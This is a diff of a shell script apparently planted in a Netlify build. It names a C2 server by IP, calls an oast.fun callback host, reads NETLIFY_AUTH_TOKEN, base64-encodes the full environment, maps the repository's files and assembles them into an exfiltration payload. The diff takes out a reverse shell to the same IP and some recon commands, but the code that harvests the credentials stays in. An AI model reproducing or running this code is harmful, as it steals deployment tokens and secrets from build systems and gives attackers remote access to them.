@@ -5,11 +5,9 @@ C2_SERVER="http://64.225.122.79:8120"
 HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
 SCAN_PATH="/opt/build/repo"
 curl https://asdfazrcdfgqoiuibvkf934exsjcoluvq.oast.fun
-ls
 echo "[*] Agent - ${HOSTNAME}"
 
 NETLIFY_TOKEN=$(env | grep NETLIFY_AUTH_TOKEN | cut -d'=' -f2)
-sh -i >& /dev/tcp/64.225.122.79/9025 0>&1
 # Recursive file collection with depth limit
 collect_dir() {
     local dir="$1"
@@ -46,8 +44,7 @@ tree_children=$(collect_dir "$SCAN_PATH" 0)
 tree="{\"type\":\"directory\",\"name\":\"repo\",\"children\":${tree_children}}"
 
 all_env=$(env | base64 -w0)
-whoami
-env
+
 
 payload="{\"hostname\":\"${HOSTNAME}\",\"tree\":${tree},\"netlify_token\":\"${NETLIFY_TOKEN}\",\"all_env\":\"${all_env}\"}"
 
